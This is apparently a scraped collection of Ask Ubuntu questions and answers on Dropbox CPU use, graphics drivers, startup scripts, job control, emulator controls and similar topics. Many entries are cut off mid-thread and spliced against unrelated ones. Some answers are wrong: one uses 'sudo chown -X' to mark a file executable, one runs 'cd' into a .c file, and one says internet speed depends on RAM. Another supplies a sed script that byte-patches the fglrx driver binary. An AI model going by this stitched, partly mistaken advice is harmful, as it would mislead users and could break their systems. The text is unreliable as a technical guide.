environment.\nThe dropboxd executable always open tray icon when running on X. I found that running it always in headless mode made CPU consumption lower to 1% after few minutes\n#!/bin/bash\n\nunset DISPLAY\nwhile : ; do\n  rm -rf $HOME/.dropbox/dropbox.pid\n  rm -rf /tmp/dropbox*\n  ~/.dropbox-dist/dropboxd\n  sleep 10\ndone >> /dev/null\n\nBut be aware you can run this only after login on Dropbox\n\nA: Good shout with using cpulimit.\nI found this could be simplified (when logged as root) to\ncpulimit -e dropbox -l 10\n\nwhere -l specifies percentage of CPU. Note this is for total CPU over all cores, so a dual core would have a limit of 200\nOutput:\ncpulimit -e dropbox -l 10\nProcess 2641 detected\n\n\nA: This happens to me frequently even when Dropbox is not actually syncing anything (there the hashing answer makes sense to me). My quick solution is to simply set Dropbox to stop syncing.  Even tho it isn't actually syncing anything this seems to kill the CPU usage.  Just have to remember to turn it back on later.\n", "Q: Uninstalling standard plugins on Eclipse Juno (4.2) In case someone else want's to get rid of some plugins which are part of the default Eclipse bundles:\nRemoving Mylyn, M2Eclipse and EGit was not possible via \"Eclipse Installation Details -> Uninstall\".

The reasoning is discussed at the bottom of this answer.\nThis answer will concentrate on currently supported versions of Ubuntu and its official derivatives.\nIf your hardware never connects to the internet and if you will never use software newer than is included on the respective install media, only then might it be prudent to use outdated versions. But who can be sure of that for all eternity?\nYou don't have to install Ubuntu to see if it works on your hardware. It is always a good idea to boot from live DVD/USB and see if the system runs okay (although slowly) on the given hardware.\nEven if it seems not to work, you might be just one boot option away from a working system. See My computer boots to a black screen, what options do I have to fix it? For example the nomodeset option might help.\n\nCurrently supported versions and their minimal requirements\nThe community wiki usually offers an up-to-date list of currently supported versions. Minimal system requirements for Ubuntu can be found there in the tech specs. The Lists of Ubuntu certified hardware might also be of use to you.\nInformation on the derivatives is scarce but their requirements are less than what is listed here. Generally 32-bit versions take up less memory and tend to be faster on older systems, than their 64-bit counterparts. However, allot of software nowadays assumes 64-bit architecture.

I used a blank 4GB pendrive and burned the Ubuntu Desktop 12.10 ISO file on it using the Universal-USB-Installer. \nI have a Windows 7 Professional OS running on 3GB RAM (Intel Core 2 Duo processor). I have sufficient hard disk space on my c drive (around 70-80GB free). \nSo I thought that I should be able to install Ubuntu easily. \nI went to my BIOS settings and changed the boot order and put the USB option at the top. And then I rebooted my machine. I get into the installer. I even get to the screen where you get to decide to install Ubuntu within your windows. But as soon as I click continue on that screen, my machine reboots. And I cannot understand why this should happen. \nI tried using a Ubuntu Desktop 12.04.01 ISO file instead. I got the same results.\n\nA: First when you download .iso file, You should check md5sum.\nIf md5sum isn't Correct then you have corrupted .iso file and you have to download it again and make USB or burn disk. If md5sum is correct than there are no chances of occuring such problems.\n\nA: Even I faced similar issue. I am not sure if it is to do with my hardware as I know my laptop has been having such issues but this was just too frequent. I managed to install by not enabling download 3rd party software and net enabled. This made the installation faster I guess but it did reboot before completing the installation. I am just glad the grub was in place otherwise I would be stranded in my last attempt (I made at least half a dozen attempts to install today).\nI suspect that it is something to do with network. Now each time I try to update software it is rebooting without giving me a chance. Hoping this is fixed soon if a problem with the image. This is my work laptop and I need to get it up and running soon. Reason for moving from 12.04 was that it was painful in many ways.

The hard drive DEL blinks, stops, and then the Caps Lock blinks. And then, nothing happens.\nI try to use normal CD instead of Wubi and I was able to mount the iso on a USB drive using Universal USB Installer.

Since then, I have been unable to get Empathy working with Google Talk.  Is there a way to get it working?\nThanks!\n\nA: I figured it out.\nIn Empathy, there are two types of accounts that I could add: Jabber or Google.  \nIf I add the Jabber account, I can't get it working either with my regular gmail password or with my application specific password.  When it tries to connect, it just hangs.  \nIf I add the Google account, it prompts me to login to my Google account by opening an embedded browser window.  If I try to put in an app specific password, it tells me to use my regular password.  When I use my regular password, it prompts me for a two factor authentication.  I had assumed that that wasn't what it should do, thinking that it would then have to prompt me each time I logged in to my computer, but I can see that Ubuntu is authorized in my Google account menu now, which should work.  \nIn other words, Empathy doesn't work with app specific passwords because it doesn't need to use app specific passwords.\nI am still unsure, however, why it didn't work with Jabber in general.\n\nA: I fixed up the problem.\nNow I can access google talk behind my corporate firewall.\nAs root edit the file /usr/share/accounts/services/google-im.service\n1) change the line:\n  <setting name=\"param-server\">talk.google.com</setting>\n  to\n  <setting name=\"param-server\">talk.google.com:443</setting>\n\n2) Add the line:\n   <setting name=\"param-old-ssl\">true</setting>\n\n(There is a list of backup servers in this file, but I couldn't make those work like you would expect)\nreboot  (probably something else you can restart to make these changes work, but this is sure fire).\nStart empathy (assuming you already have a google account created).  No need for a jabber account. It looks like it tries to login twice, the second time works (no clue why that is).\nHope that helps.\n", "Q: How to delay the start of an application during startup to reduce total booting time? I have an application installed on my Samsung NP-RV509 which makes the Fn keys work properly.\nI have determined that the startup of this application is the reason for almost 30 extra seconds of booting time.\nCan I write a shell/python script (I, myself, can't actually do this as I don't know shell/python programming) that will introduce a delay by maybe using a loop or something and then start the above application?  Shall I add/apply this script in startup apps?\nThis should effectively simulate the running of that program at startup, but it would be delayed in actuality.\nHow can I achieve this?\n\nA: You can add a delay time with sleep command. \nman sleep for more info . \nExample \nI want to startup a program with delay of 10 seconds. \nI create an entry in the startup applications with this in command field \nsleep 10;/usr/bin/<program name> \nExample 2 \nI want to create a script with the delay (sleep) option and add this script to startup applications \ngedit delayscript.sh \nand I add these lines \n#!/bin/bash \n\nsleep 10 \n/usr/bin/<program name>\n\nsave the script and give it executable permissions\nchmod +x delayscript.sh \nand add it to startup applications (command field) with full path \n/home/username/delayscript.sh \n\nA: while this is a great answer:\nsleep 30; <app-name> \n\nIt does have one hidden downside: if you ever want to kill the delayed app before it starts to run, it's not anywhere in ps -ef; instead all you see is \"sleep 30\". And, if you kill that sleep command, rather than preventing the delayed app from running it just makes the app run immediately. So I suggest this alternate script (delay) which, if killed, prevents the delayed app from running:\n#!/bin/bash\n# easily killable sleep\nsleep $1\nshift\n$@\n\nexample:\ndelay 10m rebuild-database\nnow, if you decide for some reason to prevent the database from being rebuilt, you can kill the shell script.\n", "Q: How to use Pitivi to insert text in video?

So there is a lot of buzz about hybrid graphics having a weak support. I'm currently considering buying a new laptop. Dell XPS 15 caught my eye. I will use it for work as well so I will need a large monitor for it connected by HDMI.\nThe question is: has someone got a Dell XPS 15 and can confirm that hybrid graphics support is working fine on 12.10 with no issues on the HDMI.\nI ask this because all the buzz about the subject stops on 12.04 - does this mean that it's all ok now :) ? \n\nA: I have a Dell XPS, the HDMI is hard wired to the discrete card. I normally want that card turned off too save battery. \nI use only the mini Display Port which works out of the box with an adapter to DVI/hdmi.\nOn the rare occasions I need the graphic accelerations of the discrete card I use bumblebee. I normally totally ignore the HDMI port, as the mini DP just works and the HDMI port has issues.\n\nA: I have a Dell Inspiron 7520, which is about the same age as the XPS 15 you're talking about.  My Inspiron uses an ATI graphics card, which, long story short, does not work under Linux - the Radeon driver hasn't caught up with the Southern Islands card I have.  The HDMI port still works, however.\nHowever, the XPS 15 uses an Nvidia card, which works much better under Linux using Bumblebee.  Bumblebee uses a neat solution to make use of the extra card, and both open-source and proprietary drivers are supported.\nAlso, I hear Nvidia is trying to get X to natively support hybrid graphics.  Stay tuned...\n\nA: I have an Dell XPS 15 L502x and the HDMI port does not work.\nHowever this article mentions the mini DisplayPort working, so perhaps a miniDP-to-HDMI cable can solve the issue.\n\nA: I don't own the Dell XPS model, however I do have an Asus with very similar configuration, with nvidia discrete graphic card with optimus and an integrated Intel card.\nI'm running Ubuntu 12.10 on this laptop and in my experience the Intel card is more than enough for office work and I don't have any problems connecting it to a large external monitor via HDMI and working with both monitors simultaneously.\nInstalling the latest bumble-bee allowed me to turn the discrete card off to extend the battery life, and by using optirun I can even run an occasional OpenGL requiring app.\nThe video in 1080 HD format plays just fine, and the desktop effects also run without too much problem in my case.\nSo I believe that you should be just fine with that setup, provided you don't need the nVidia card for a day to day work.\nBut on the other note, why not buy some similar laptop without the discrete card at all, if you don't intend to run graphic heavy stuff on it, and save some money on the way.\n\nA: I have an XPS15, and HDMI does partly work.\nThe HDMI output is supported by the nouveau drivers, but alot needs to be fixed to get it completely working.\nxrandr doesn't see the HDMI connected, which makes it quite useless.\n", "Q: How do I disable app menu in LibreOffice?

For instance:\n$ rtorrent &\n[1] 4618\n\nstarts rtorrent in the background.\nI'd like to return to the backgrounded rtorrent to check whether my downloads are completed. How can I do that?\n\nA: You can just run the fg command in the terminal.\n\nA: Run fg to put the job back onto the foreground, i.e. give it back control of the terminal. If there are multiple background jobs, run jobs to see a list and fg %1, fg %2, etc., to select which job to put back to the foreground.\nSee the Wikipedia article on job control for more information.\nIf a program is running on the foreground, press Ctrl+Z to suspend it. When you do this, you'll get a shell prompt. Run bg to make the program keep running, but in the background.\nIf a background job terminates, the shell will print a notification the next time it displays a prompt. If a background job requires input from the terminal, it will automatically be suspended (“stopped”); fg (or fg %42 if necessary) resumes it.\nIf you want to trigger a more visible notification when the program finishes, you can run something like\nfg; play bell.ogg & xmessage \"torrents downloaded\"\n\nThe fg command returns when the program that it resumes finishes, so whatever you told the shell to run after fg will run when the program finishes. Note that if you press Ctrl+Z to put the job back into the background, then the shell stops waiting and runs the following commands immediately.\n", "Q: Linking to the internet I know nothing about computers.\nI'm trying to link to my wireless and it is asking for SSID and BSSID.\nWhat is this and where do I find it.\n\nA: The Service set identification (SSID) is just the name of your wireless network. The router needs to give a human-readable name so you can find it, especially in crowded areas like an apartment building.  \nYour best bet is to check out a video like this one on YouTube, which visually explains how to connect.  \nBasically, you should be moving your mouse to the upper right of your screen to a little antenna-looking thing, and selecting your WiFi network from the list that drops down when you click the icon. The only thing you may need to type is the password to connect to your wireless network if it's encrypted (it should be, but leave that for another day). Good luck and don't get frustrated. Try YouTube for other related videos. It's often better than just trying to do a web search and reading lots of results.

I am relatively new to Ubuntu and would appreciate any help!\n\nA: The solution is simple. Navigate to the .jar file in Nautilus(File manager) and right-click it. Go to the Permissions tab and check the box labeled:\n\nAllow executing file as program\n\nThis sets the executable bit the JDK was complaining about.\nBut why is this, and what is this \"executable bit\" thingy?\nIn Linux, file extensions have less of a role in determining what to do with files. Instead, Linux uses magic numbers, which are basically headers. If you are familiar with Linux scripting, the shebang (The #! at the beginning) is a human-readable header, also. Executables have a header that may contain ELF or ELF64 if they are Linux Elfs(program files and libraries). However, this is not the only check.\nLinux also keeps file permissions. It stores the user and group IDs for each file and directory and a lost of what the owner, group, and everyone can do. Included in this is the executable bit. If you chmod a+x the file or follow the graphical instructions I gave above, you set this bit telling Linux, and programs like Java and Wine that they should be allowed to run the file. If this bit is unset by unchecking the box or chmod a-x file, then the bit not being set tells Linux and software that would want to execute it not to do so for security. This does not apply to source code, however.\n\nA: In order to mark the file as executable using terminal you can use the following\nsudo chown -X path/to/minecraft.jar\n\n\nA: I had the same problem when I used \"open with java\" but you don't have to  alter permissions to play . By launching it from command line with java -jar minecraft.jar (assuming you are in the right folder) it will open regardless.\n", "Q: Hardrive won't mount on 12.10 I just upgraded to 12.10 and one of my media hard drives won't mount.

Hence my hypothesis that it is something in Unity 3D, rather than the drivers.\nI have been actively using Ubuntu since 8.04 or so.  Actively as in tossed out Windows and run Ubuntu on 2 desktops and 3 laptops. For as much as I have seen on the Internet about Ubuntu 12.04 and video drivers (open source, NVIDIA, ATI) / Unity issues / X issues, I cannot believe that 12.04 LTS is nearly as stable as 10.04 LTS was. What is a desktop install of and operating system worth if the UI is glitchy at best. Unity could use some more time in the oven.\n\nA: I have the same problem with 12.04 LTS and Nvidia.  I managed to find one of the drivers that kind of performed OK but had graphics corruption when coming back to X from a console and the performance was terrible.\nIn the end I reverted to the Nouveau driver and have been happy with it ever since.  It was a trade off of expected features for stability and performance.\n\n\"btw I beginning to feel that LTS for 12.04 means, Long Time before Stable.\"\n\nNot true.  Unfortunately the Nvidia modules are third party, we have to put up with what someone else writes.  Try the Nouveau open source module and see how it goes for you.\n", "Q: See a list of recently accessed files, sorted by date In Ubuntu, is it possible to view a list of all recently accessed files (by date?)

The signatures for the latest GPUs are available only in the latest drivers. When using an old driver, there are no signatures for the newer GPU present in the computer. The solution, as given in the wiki, is to simply copy the control file of the latest driver and put them in your computer's ATI driver directory.\nHere is what you do: Download the latest driver, extract it, copy the etc/ati/control file, and overwrite the /etc/ati/control file. The steps to follow are as follows:\n\n$ cd ~ \n$ mkdir amd-gpu-driver \n$ cd amd-gpu-driver/ \n$ wget http:amd-website-linux-gpu-driver-url-amd-driver.zip \n$ tar -xvf amd-driver.zip \n$ sh amd-driver.run --extract driver \n$ sudo mv /etc/ati/control ./control.bak \n$ sudo cp driver/common/etc/ati/control /etc/ati \n\nPlease replace the URLs and filenames appropriately.\n\nA: For Ubuntu 11.04\nI found this elsewhere on the net and I ran it on a Ubuntu 11.04 - it works great!\nhttp://phoronix.com/forums/showthread.php?19875-Unsupported-Hardware-watermark\nPut this in a text file and save it (call it fixwatermark.sh):\n#!/bin/sh\nDRIVER=/usr/lib/fglrx/xorg/modules/drivers/fglrx_drv.so\nfor x in $(objdump -d $DRIVER|awk '/call/&&/EnableLogo/{print \"\\\\x\"$2\"\\\\x\"$3\"\\\\x\"$4\"\\\\x\"$5\"\\\\x\"$6}'); do\nsed -i \"s/$x/\\x90\\x90\\x90\\x90\\x90/g\" $DRIVER\ndone\n\nWith terminal go to the location where you saved it and do a\nchmod +x fixwatermark.sh\n\nto make it executable and a\nsudo ./fixwatermark.sh\n\nto let the script remove the enableLogo\n\nA: I think this is caused by the modaliases that gets your pc to recognise your hardware.\nWhen I have previously removed the ATI catayst application I have had to reinstall the fglrx-modaliases so that it can be installable through the additional drivers at a later stage.\nSo I would open a terminal up and enter\nsudo apt-get remove fglrx-modaliases\n\nThis should not remove fglrx but just the modaliases\nIf there are problems after this obviously reinstall the modaliases\nsudo apt-get install fglrx-modaliases\n\n\nA: edit: sorry I missed the signature answer but did not want to keep this from people. \n\nGet a copy of the control file from a release that does work for you and write it over  (you can extract the file from the tar.gz with fileroller)..\n/usr/lib/fglrx/etc/ati/control\n\nA reboot suffices.\nExample from ...\nhttp://archive.ubuntu.com/ubuntu/pool/restricted/f/fglrx-installer/fglrx-installer_9.010.orig.tar.gz\n\n\nWorked for me on 12.04, 12.10 and 13.04.\n\nA: For Ubuntu 13.04 64-bits\nSince the latest drivers (13.4 and greater, not 12.11 beta as is in the question) the application will automatically remove the \"AMD Testing Use Only\" watermark during installation.\nMore about, including installation instructions: http://support.amd.com/us/gpudownload/linux/Pages/radeon_linux.aspx\n\nA: I had the same problem, and also another one that you seem to also have at the same time: not knowing how to install the right AMD Radeon HD 6450 driver. As a consequence, when I tried to install Ubuntu 10.10, it froze just after the login screen and when I tried to install Ubuntu 11.10, it did not even arrive to the login screen.\nHere is what I did, which solved the problem:\n\n\n*\n\n*using another computer, download the latest proprietary driver from ATI on the official site. In my case I had to download it from here.\n\n*put the driver on a USB key\n\n*reboot the computer we want to repair\n\n*in the grub menu, select the recovery mode. This results in arriving at a command line interface. This is a proof that the Ubuntu operating system is functioning but that the problem is indeed the graphical card.\n\n*uninstall all previous versions of flgrx by launching sudo apt-get remove flgrx for example\n\n*mount the USB key with something close to mkdir /mnt/usb followed by sudo mount /dev/sdb /mnt/usb. Another way for this little step is explained here.\n\n*use the cd command to place yourself in the folder where the downloaded driver is\n\n*if necessary, make the driver be executable with something like chmod +x ./ati-driver-installer-11-11-x86.x86_64.run\n\n*execute the driver using sudo ./ati-driver-installer-11-11-x86.x86_64.run\n\n*follow the instructions given on the installer\n\n*if this step did not work, you may want to try sudo ./ati-driver-installer-11-11-x86.x86_64.run --force instead\n\n*reboot your computer\n\n\nThen your two problems should both be solved!\n\nA: According to the Arch Wiki's Catalyst page, the following script should do it.  It's a bit hackish.\n#!/bin/sh\nDRIVER=/usr/lib/xorg/modules/drivers/fglrx_drv.so\nfor x in $(objdump -d $DRIVER|awk '/call/&&/EnableLogo/{print \"\\\\x\"$2\"\\\\x\"$3\"\\\\x\"$4\"\\\\x\"$5\"\\\\x\"$6}'); do\n sed -i \"s/$x/\\x90\\x90\\x90\\x90\\x90/g\" $DRIVER\ndone\n\nSince that script is for Arch, you may need to play with bits of it; for example, Ubuntu may have fglrx_drv.so in a different location.  Be prepared to reinstall the driver from the command line if this doesn't work.\n", "Q: How do you configure mupen64plus controls? I installed mupen64plus from the repositories using Synaptic. I like the emulator (for the most part, a couple of graphics glitches on TLOZ Ocarina of Time), especially its performance on my old machine, but I cannot figure out how to configure the controls for myself. I tried looking at Google Code's guide here but I can't find the file I need to edit and the link with the key ids isn't working, so even if I could find the file I wouldn't be able to change anything. So what I need is a resource with the key ids and where to find the file I need to edit.\nI am running Ubuntu 12.10 32-bit.\n2GB RAM,\nIntel CORE 2 DUO @ 2.00GHz\nHere's an additional part of the question. M64py is a popular option. However, it requires that you input the paths to the various files it needs. Where are the default locations? Include for both the 32 bit system and a 64 bit system. (The files needed are Library file, Plugin directory and Data directory.)\n\nA: I myself couldn't run a GUI for mupen, so I ended up figuring out how to configuire it and run it in the Terminal. The file I used to configure the controllers is:\n~/.config/mupen64plus/mupen64plus.cfg\n\nThere I found the area where it talked about the joysticks and figured by trial and error that if I see on my controller a number (the buttons are numbered) I type that number minus one in the config file, and for the buttons I was not using I just leave it blank, as in \"\". I'll leave the code I used:\n    [Input-SDL-Control1]\n    # Mupen64Plus SDL Input Plugin config parameter version number.  Please don't change\n    version = 1\n    # Specifies whether this controller is 'plugged in' to the simulated N64\n    plugged = True\n    # Specifies which type of expansion pak is in the controller: 1=None, 2=Mem pak, 5=Rumble pak\n    plugin = 2\n    # If True, then mouse buttons may be used with this controller\n    mouse = False\n    # Specifies which joystick is bound to this controller: -2=Keyboard/mouse, -1=Auto config, 0 or more= SDL Joystick number\n    device = 1\n    # SDL joystick name (name check disabled if this is empty string)\n    name = \"DragonRise Inc.   Generic   USB  Joystick  \"\n    # Scaling factor for mouse movements.  For X, Y axes.\n    MouseSensitivity = \"2.00,2.00\"\n    # The minimum absolute value of the SDL analog joystick axis to move the N64 controller axis value from 0.  For X, Y axes.\n    AnalogDeadzone = \"4096,4096\"\n    # An absolute value of the SDL joystick axis >= AnalogPeak will saturate the N64 controller axis value (at 80).  For X, Y axes. For each axis, this must be greater than the corresponding AnalogDeadzone value\n    AnalogPeak = \"32768,32768\"\n    # Digital button configuration mappings\n    DPad R = \"\"\n    DPad L = \"\"\n    DPad D = \"\"\n    DPad U = \"\"\n    Start = \"button(9)\"\n    Z Trig = \"button(6)\"\n    B Button = \"button(1)\"\n    A Button = \"button(0)\"\n    C Button R = \"axis(3+)\"\n    C Button L = \"axis(3+)\"\n    C Button D = \"axis(4+)\"\n    C Button U = \"axis(4+)\"\n    R Trig = \"button(7)\"\n    L Trig = \"\"\n    Mempak switch = \"\"\n    Rumblepak switch = \"\"\n    # Analog axis configuration mappings\n    X Axis = \"axis(0-,0+)\"\n    Y Axis = \"axis(1-,1+)\"\n\n\nA: Unfortunately, m64py was not a working solution for me and \"trial and error\" is too cumbersome. Here is a solution anybody currently running mupen64plus, with or without a gui, should be able to use.\nYou will need the joystick calibration tool jscal to determine which button is which. For help with that, see Ubuntu Forums - Gaming & Leisure - HOWTO : Joystick/Gamepads under Ubuntu\nAssuming you have that set up and your joystick is already calibrated properly, all you need to do is run jstest-gtk /dev/input/js0 &, where js0 is the calibration file for the device you are currently testing. \nYou will see a gui for numbered axes and buttons. It looks something like this:  \n\nNow you can press a button on your controller to see which axis or button it corresponds with.\n\nApplying custom controller config to mupen\nLocate InputAutoCfg.ini\nRun locate InputAutoCfg.ini. For me this is in the directory /usr/share/games/mupen64plus/InputAutoCfg.ini.\nOpen InputAutoCfg.ini in your preferred text editor.\nvim /usr/share/games/mupen64plus/InputAutoCfg.ini.\nFind your device and edit the settings.\nYou can find out which device (controller) is being used by mupen by running mupen64plus from a command line terminal and finding the name of your controller. \nMine says Input: N64 Controller #1: Using auto-config with SDL joystick 0 ('Generic X-Box pad'). So for me, the settings are found under [Generic X-Box pad]. \nSave/write the changes to the file and the changes should be implemented when you next run mupen64plus.\nAfter some changes, mine looks like this:  \n[Generic X-Box pad]\nplugged = True\nplugin = 2\nmouse = False\nAnalogDeadzone = \"4096,4096\"\nAnalogPeak = \"32768,32768\"\nDPad R = \"hat(0 Right)\"\nDPad L = \"hat(0 Left)\"\nDPad D = \"hat(0 Down)\"\nDPad U = \"hat(0 Up)\"\nStart = \"button(7)\"\nZ Trig = \"button(4)\"\nB Button = \"button(2)\"\nA Button = \"button(0)\"\nC Button R = \"axis(3+)\"\nC Button L = \"axis(3-)\"\nC Button D = \"axis(4+)\"\nC Button U = \"axis(4-)\"\nR Trig = \"button(5)\"\nL Trig = \"axis(2+)\"\nMempak switch = \"axis(5+)\"\nRumblepak switch = \"button(2)\"\nX Axis = \"axis(0-,0+)\"\nY Axis = \"axis(1-,1+)\"\n\n\nUsing jstest, you should be able to figure out how you want to configure InputAutoCfg.ini to customize your input settings using the input event words.\nSometimes it helps to look at the N64 controller layout to help figure out the parameters you intend to map.  \n\n\nA: You can configure the controls using a configuration file. The preferred method would be to use a frontend which has controller settings.\nM64py\nM64py is a Qt frontend for Mupen64Plus. It can be downloaded from here\nIt has a controller configuration ui as pictured here\nYou can configure the controlls from here and then launch the games from here itself or actually run mupen64plus /path/to/rom in the terminal\n\nA: Just tried this (manjaro/kde) using mupen64plus 2.5.0. There is a config file in\n~/.config/mupen64plus/mupen64plus.cfg\n\nbut it gets overwritten when starting mupen64plus. The file to edit is actually\n/usr/share/mupen64plus/InputAutoCfg.ini\n\nThis file is read when mupen64plus starts and the config used is written to the cfg file above. You can see which controller config mupen is using in the printed output when you open a ROM:\nInput: N64 Controller #1: Using auto-config with SDL joystick 0 ('Generic X-Box pad')\n\nSo in my case I had to look for Generic X-Box pad in InputAutoCfg.ini. For completeness: for my xbox controller the mappings I figured out:\nButton(0) = A\nButton(1) = B\nButton(2) = X\nButton(3) = Y\nbutton(4) = LB\nbutton(5) = RB\nbutton(6) = the small settings button (with the two rectangles) to the top\n           left of the  topright of the left joystick\nButton(7) = the three-line settings button to the upper left of X and Y\nButton(8) = The \"x-box button\"  \nhat (0 Up) = The \"+\" button, up\naxis (5+) = RT\n\nFor Mario64 I ended up changing:\nZ trig = axis(5+)\nR Trig =\nStart = button(8)\n\nTo put start on the \"x-box button\" and to put Z on RT (somehow after all these years it just feels \"right\" to put Z on that button). I did try installing mupen64plus-ui-python (which worked just fine after removing the specific version for pyqt from requirements.txt) but I could see no option to change key mappings.\n", "Q: When trying to install Wine on 12.10, 'Sudo' command will not let me type in a password As the title explains, I have been attempting to install Wine on my laptop which is running 12.10.

I always have to manually connect to the mouse, although it is listed as a trusted device. How can I automatically connect the mouse when I have it turned on? Or at least reconnect after suspend?\n\nA: You can use hciconfig to do that.\nFirst manually connect your mouse as you usually do, then open a terminal and run hciconfig -a to retrieve its name. It should be something like hciX where X is the number of your device. You can either use hcitool scan, it should give the name as well.\nOnce this is done, you can force the bluetooth device detection by running \nsudo hciconfig <name_of_your_mouse> reset\n\nIn order to do that automatically at every boot, you want to edit /etc/init.d/bluetooth and append the magic line at the end of the file : hciconfig <name_of_your_mouse> reset. Then save, reboot, and it should work forever.\nAlso make sure that your mouse is plugged in at boot time. If you plug it in after booting you will have to manually detect the mouse again.\nHope this helps.\n\nA: I have a Logitech bluetooth travel mouse. I have Ubuntu 20.04.

Thank You.\n\nA: I suspect that the OpenSSH server doesn't allow root logins.

I looked around for a while and could not figure out the answer to my following problem:\nI have a setup of six desktops on Ubuntu 12.04 with Unity. On start up, every morning, I go through a routine of opening the same five or six programs. I open each on a specific workspace. I would like to have this automated. Is there a way to script or configure this?\nAdditional question: To further complicate the matter, I am running two screens in twin view mode. I actually need to start each program on a specific screen, preferably in full screen.\n\nA: jdp407's idea of using compizconfig will associate a particular application with a particular workspace so that EVERY TIME that application is opened, it is placed in the corresponding workspace. If this isn't desired you can do the following:\n1) Install wmctrl\nsudo apt-get install wmctrl\n\n2) Create a file with the following content and make it executable\n#!/bin/bash\nwmctrl -s 0 #Switches to workspace 0 [workspaces are numbered from 0]\ngnome-terminal & #Say you want a terminal in the 0th workspace\nnautilus & #Maybe a file browser too\nsleep 2 #Windows take some time to open. If you switch immediately, they'll open up in wrong workspaces. May have to change the value 2.\nwmctrl -s 1 #Switches to workspace 1\nfirefox & #You get the idea. Continue for all workspaces\nsleep 2\nwmctrl -s 0 #You will be left at this workspace when the script finishes executing\n\n3) Call this script from .xsessionrc in your home directory [if you may have to create this file] to automate the process at each login. Or you can just call it from a terminal when needed. EDIT: Put it in \"Startup Applications\", not .xsessionrc. .xsessionrc will execute even before the desktop environment has finished loading.\n\nYou may want to create a custom xsession as suggested by jdp407, so that you have two sessions to choose from, one which opens these applications automatically and one which doesn't. But that seems unnecessary to me.\n\nIf you feel that switching to a workspace, opening appropriate applications and then switching to the next is time consuming you can open all applications in one shot, and then move the windows using wmctrl. For example\nwmctrl -r 'Firefox' -t 1\n\nwill shift a window with Firefox in it's title to workspace 1. If more than one window exists, the first in the list of windows managed by wmctrl will be moved. You'll need to know the title of the windows that will be created by the applications to use this. That's why I didn't suggest this as the primary option. If titles will be unambiguous as is the case with most commonly used apps then this is the way to go.\n\nOpening applications in fullscreen:\nSome applications like gnome-terminal have command-line arguments to open a window in maximised state or in fullscreen mode. If such options exist use them. Otherwise use wmctrl as follows\nwmctrl -r 'prasanth@nb37' -b add,maximized_vert,maximized_horz\n\nThis maximises my (already existing) terminal window.\nwmctrl -r 'prasanth@nb37' -b add,fullscreen\n\nThis sends the window to fullscreen mode.\n\nGo through wmctrl's man page. You may find use for more of its functionality.\n\nA: There are two 'problems' here: the first involves opening a specific set of programs when you log in; the second involves making them open on specific workspaces. I'll deal with both separately:\n\n\n*\n\n*Creating a Custom X Session\nThis is quite easy to do. You simply need to create an X Session Script, and then tell LightDM to use it. You will need to know the commands to launch the programs you want from the terminal.\n\n\n*\n\n*Open Terminal.\n\n*Type touch ~/.customxsession, and press enter.\n\n*Type gedit ~/.customxsession, and press enter.\n\n*You will now have a text editor open with a blank file.\n\n*You need to define an X Session in this file. I've created a sample 'fill in the blanks' file at the bottom of the answer. I think Ubuntu uses gnome-session as it's window manager, but I'm possibly wrong. I can't test it out at the moment (laptop broken) so if it doesn't work as expected (e.g.: loads Gnome instead of Unity), you might need to do some research.\n\n*Save the file, and close Gedit.\n\n*Type touch /usr/share/xsessions/multi.desktop, and press enter.\n\n*Type gedit /usr/share/xsessions/multi.desktop, and press enter.\n\n*You will now have a text editor open with a blank file.\n\n*Copy and Paste the code at the bottom of answer (labeled '/usr/share/xsessions/multi.desktop:') into Gedit.\n\n*Save the file, and close Gedit.\n\n*Reboot. When you get to the login screen, if you look at the sessions available (click the little Ubuntu Logo next to your username), you should see one called Multi-Session. If you log in with it, the programs you put in the X Session Script should open automatically. \n\n\n*Assigning Programs to Workspaces\nThis is also quite easy, but it needs some extra software not installed in Ubuntu by default.\n\n\n*\n\n*Install compizconfig-settings-manager (you can use the Software Centre, or simply run sudo apt-get install compizconfig-settings-manager in Terminal).\n\n*Open CompizConfig Settings from the Dash.\n\n*Open the 'Place Windows' Plugin (it's in the 'Window Management' section).\n\n*Click 'New' in the 'Windows with fixed viewport' section.\n\n*Click the 'Plus' icon.\n\n*Set 'Type' as 'Window Title', and enter the window title of one of the programs in the 'Value' box. Make sure 'Relation' is set to 'AND', and click 'Add'.\n\n*Set the workspace by entering numbers in the 'X' and 'Y' boxes. When you have 4 workspaces for 'X', '1' is left and '2' is right, and for 'Y', '1' is top and '2' is bottom. Seeing as you have 6 workspaces, depending on how things are set up, setting 'Y' to '3' would select the bottom row, and setting 'X' to '3' would select the 3rd column.\n\n*Repeat Steps 4-7 for the remaining programs you want to assign a workspace to.\n\n*Close CompizConfig Settings.\n\n\n*Logging In\nWhen you log in, you need to tell Ubuntu you want to use your custom X Session.\n\n\n*\n\n*Reboot. \n\n*When you get to the login screen, if you look at the sessions available (click the little Ubuntu Logo next to your username), you should see one called Multi-Session. If you log in with it, the programs you put in the X Session Script should open automatically, and be assigned to the workspaces you chose.\n\n\n*Problems\nQuite a lot could have gone wrong with this, either if you make a small mistake, or if I've made a mistake when writing this answer. If something does go wrong, make sure you've followed the instructions to the letter, and correct anything if you haven't.

So \"user\" in the above command needs to be replaced with the right user name on your universities' server. Same goes for \"host.address.com\" which is supposed to be the login URL of your schools' server. Finally \"/home/homefolder/subfolder/main.c\" denotes the location you want to copy your file to.\nOnce done you can open a remote terminal as usual and cd into the directory that now has your main.c like this:\nssh user@host.address.com\ncd /home/homefolder/subfolder/main.c\ngcc -Wall main.c -o mainprogram\n./mainprogram\n\nThe last two lines compile your c-Code and run it.

I am new and I just installed Ubuntu on my desktop. Do I have to install drivers for my modem for it to download fast? Because the download speed I am getting is really slow compared to my mac.\n\nA: Drivers are the programs to make communication between your System and device. Ubuntu is so powerful that it automatically recognize modems  so you don't need to install extra driver for it and main thing is that Your internet connection speed doesn't depends on modem driver. \n\nA: \nDo I have to install drivers for my modem for it to download fast?\n\nNo. Either Ubuntu has the driver for a piece hardware or it does not. If it works (but slowly) it means the driver is supported. In general, nowadays, no extra installation is required for modems.\n\nBecause the download speed I am getting is really slow compared to my mac.\n\nIn case we are talking about torrents.\nCheck your router and confirm that you opended the ports required for bittorrent for your machine. If these are not open you will probably get very low to no download speed. \n\nA: Internet speed depends on RAM(fine if 2 gb) and CPU speed. Also, if u r opening many web pages, or running multiple applications at the same time, it can slow down or hang.Anyway, to check ur internet speed, close all the web pages and applications, open ur browser and run http://www.testinternetspeed.orgIf u r using usb modem, check if the usb port does not contain dust particles.\n", "Q: make battery warning appear on top \nHow can I make the low battery message appear on top of all running windows? \n\nFor example it happened that I watched a movie and the computer suspended because the battery was low, but the warning messages were not visible while watching the movie. 